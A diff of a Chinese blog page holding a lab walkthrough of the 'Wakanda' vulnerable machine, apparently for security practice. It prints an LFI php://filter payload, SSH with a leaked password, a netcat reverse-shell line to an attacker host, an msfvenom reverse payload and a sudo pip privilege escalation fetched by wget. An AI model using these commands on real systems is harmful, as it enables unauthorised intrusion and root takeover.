@@ -82,18 +82,18 @@
 
 
 
-<meta name="description" content="首先发现主机：netdiscover或者arp-scan -l，发现靶机 然后nmap -sS -p- (victim_url)，开放的端口有80，111，3333.访问以下80端口，源码中有一行注释： 1&amp;lt;!--herf=&amp;quot;?lang=fr&amp;quot;--&amp;gt;  尝试给访问url/?lang=fr，发现页面的语言变成了法语。考虑文件包含，访问url/?lang=php://f">
+<meta name="description" content="首先发现主机：netdiscover或者arp-scan -l，发现靶机 然后nmap -sS -p- (victim_url)，开放的端口有80，111，3333. 访问以下80端口，源码中有一行注释： 1&amp;lt;!--herf=&amp;quot;?lang=fr&amp;quot;--&amp;gt; 尝试给访问url/?lang=fr，发现页面的语言变成了法语。考虑文件包含，访问url/?lang=php://f">
 <meta name="keywords" content="CTF WEB">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Wakanda靶机渗透">
 <meta property="og:url" content="http://yoursite.com/2019/04/22/Wakanda靶机渗透/index.html">
 <meta property="og:site_name" content="CH4SER || 自闭室">
-<meta property="og:description" content="首先发现主机：netdiscover或者arp-scan -l，发现靶机 然后nmap -sS -p- (victim_url)，开放的端口有80，111，3333.访问以下80端口，源码中有一行注释： 1&amp;lt;!--herf=&amp;quot;?lang=fr&amp;quot;--&amp;gt;  尝试给访问url/?lang=fr，发现页面的语言变成了法语。考虑文件包含，访问url/?lang=php://f">
+<meta property="og:description" content="首先发现主机：netdiscover或者arp-scan -l，发现靶机 然后nmap -sS -p- (victim_url)，开放的端口有80，111，3333. 访问以下80端口，源码中有一行注释： 1&amp;lt;!--herf=&amp;quot;?lang=fr&amp;quot;--&amp;gt; 尝试给访问url/?lang=fr，发现页面的语言变成了法语。考虑文件包含，访问url/?lang=php://f">
 <meta property="og:locale" content="default">
 <meta property="og:updated_time" content="2019-08-06T07:45:40.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Wakanda靶机渗透">
-<meta name="twitter:description" content="首先发现主机：netdiscover或者arp-scan -l，发现靶机 然后nmap -sS -p- (victim_url)，开放的端口有80，111，3333.访问以下80端口，源码中有一行注释： 1&amp;lt;!--herf=&amp;quot;?lang=fr&amp;quot;--&amp;gt;  尝试给访问url/?lang=fr，发现页面的语言变成了法语。考虑文件包含，访问url/?lang=php://f">
+<meta name="twitter:description" content="首先发现主机：netdiscover或者arp-scan -l，发现靶机 然后nmap -sS -p- (victim_url)，开放的端口有80，111，3333. 访问以下80端口，源码中有一行注释： 1&amp;lt;!--herf=&amp;quot;?lang=fr&amp;quot;--&amp;gt; 尝试给访问url/?lang=fr，发现页面的语言变成了法语。考虑文件包含，访问url/?lang=php://f">
 
 
 
@@ -421,30 +421,27 @@
 
       
         <p>首先发现主机：<code>netdiscover</code>或者<code>arp-scan -l</code>，发现靶机</p>
-<p>然后<code>nmap -sS -p- (victim_url)</code>，开放的端口有80，111，3333.<br>访问以下80端口，源码中有一行注释：</p>
+<p>然后<code>nmap -sS -p- (victim_url)</code>，开放的端口有80，111，3333.<br>
+访问以下80端口，源码中有一行注释：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--herf=&quot;?lang=fr&quot;--&gt;</span><br></pre></td></tr></table></figure>
-
-<p>尝试给访问<code>url/?lang=fr</code>，发现页面的语言变成了法语。考虑文件包含，访问<code>url/?lang=php://filter/read=convert.base64-encode/resource=index</code>(index和index.php都要试一下)。<br>解码之后得到源码：</p>
+<p>尝试给访问<code>url/?lang=fr</code>，发现页面的语言变成了法语。考虑文件包含，访问<code>url/?lang=php://filter/read=convert.base64-encode/resource=index</code>(index和index.php都要试一下)。<br>
+解码之后得到源码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password =<span class="string">"Niamey4Ever227!!!"</span> ;<span class="comment">//I have to remember it</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'lang'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'lang'</span>].<span class="string">".php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>这里有一个密码，然后在之前的网页中，可以看见最下方有一个用户名，尝试用这个用户名和密码去ssh登陆。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mamadou@(url) -p 3333</span><br></pre></td></tr></table></figure>
-
 <p>然后输入密码就可以连接进入靶机了。进入之后发现是一个python的交互界面，这个时候可以调用<code>pty</code>库来进入交互式的<code>shell</code></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pty</span><br><span class="line">pty.spawm(<span class="string">"/bin/bash"</span>)</span><br></pre></td></tr></table></figure>
-
 <p>这样子我们就来到了bash，并拿到了第一个flag，尝试使用命令<code>sudo -l</code>来查看当前用户<code>所能执行的root用户命令</code>，结果并没有可执行的root命令。查看有没有其他用户(可以通过查看<code>/etc/passwd</code>或者<code>/home</code>目录下的用户得知用户信息)。发现有一个叫做<code>devops</code>的用户，通过<code>find / -user devops 2&gt;/dev/null</code>来发现<code>devops</code>的文件，发现第二个flag，同时还有一个<code>.antivirus.py</code>文件。</p>
 <p>进入发现源代码如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(<span class="string">'/tmp/test'</span>,<span class="string">'w'</span>).write(<span class="string">'test'</span>)</span><br></pre></td></tr></table></figure>
-
-<p>我们将那个test文件删掉之后过一段时间又会出现，然后结合py的文件名，可以推测这个脚本会隔一段时间执行一次。<br>那么我们可以利用这个来反弹shell。改写改py文件如下:</p>
+<p>我们将那个test文件删掉之后过一段时间又会出现，然后结合py的文件名，可以推测这个脚本会隔一段时间执行一次。<br>
+那么我们可以利用这个来反弹shell。改写改py文件如下:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">"nc (my_host) -p 4444 -e '/bin/bash' -i"</span>)</span><br></pre></td></tr></table></figure>
-
 <p>然后其他的writeup中是这样利用的：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python lhost=192.168.43.242 lport=4444 R</span><br></pre></td></tr></table></figure>
-
-<p>然后把生成的<code>poc</code>写进py文件中来。<br>然后在自己的攻击机上开启nc,<code>nc -lvp 4444</code>由于py文件执行的时候，执行的身份是<code>devops</code>所以我们得到的是devops的shell，可以查看第二个flag的内容了。</p>
-<p>然后<code>sudo -l</code>查看该用户可用的管理员命令，发现一个<code>pip</code>可以执行，然后有一个<code>Fakepip</code>的脚本可以利用，在攻击机上把脚本给下载过来，然后在脚本目录下运行<code>sudo python -m SimpleHttpServer 80</code>来运行简单的<code>python http</code>服务，然后在靶机上运行<code>wget http://(attacker url)/setup.py</code>来把Fakepip中的setup脚本传输过去。记得在传输之前修改setup脚本中的lhost和lport，然后在靶机中运行setup.py，同时在攻击机上面运行<code>nc -lvp 4444</code>接受shell，然后就得到了root权限</p>
+<p>然后把生成的<code>poc</code>写进py文件中来。<br>
+然后在自己的攻击机上开启nc,<code>nc -lvp 4444</code>由于py文件执行的时候，执行的身份是<code>devops</code>所以我们得到的是devops的shell，可以查看第二个flag的内容了。</p>
+<p>然后<code>sudo -l</code>查看该用户可用的管理员命令，发现一个<code>pip</code>可以执行，然后有一个<code>Fakepip</code>的脚本可以利用，在攻击机上把脚本给下载过来，然后在脚本目录下运行<code>sudo python -m SimpleHttpServer 80</code>来运行简单的<code>python http</code>服务，然后在靶机上运行<code>wget http://(attacker url)/setup.py</code>来把Fakepip中的setup脚本传输过去。记得在传输之前修改setup脚本中的lhost和lport，<a href="http://xn--setup-4n1h846arhg5r4bh4ut71dw3sgxw.py" target="_blank" rel="noopener">然后在靶机中运行setup.py</a>，同时在攻击机上面运行<code>nc -lvp 4444</code>接受shell，然后就得到了root权限</p>
 
       
     </div>
@@ -551,7 +548,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">33</span>
+                  <span class="site-state-item-count">34</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -713,7 +710,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">59.7k</span>
+    <span title="Site words total count">61.5k</span>
   
 
   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
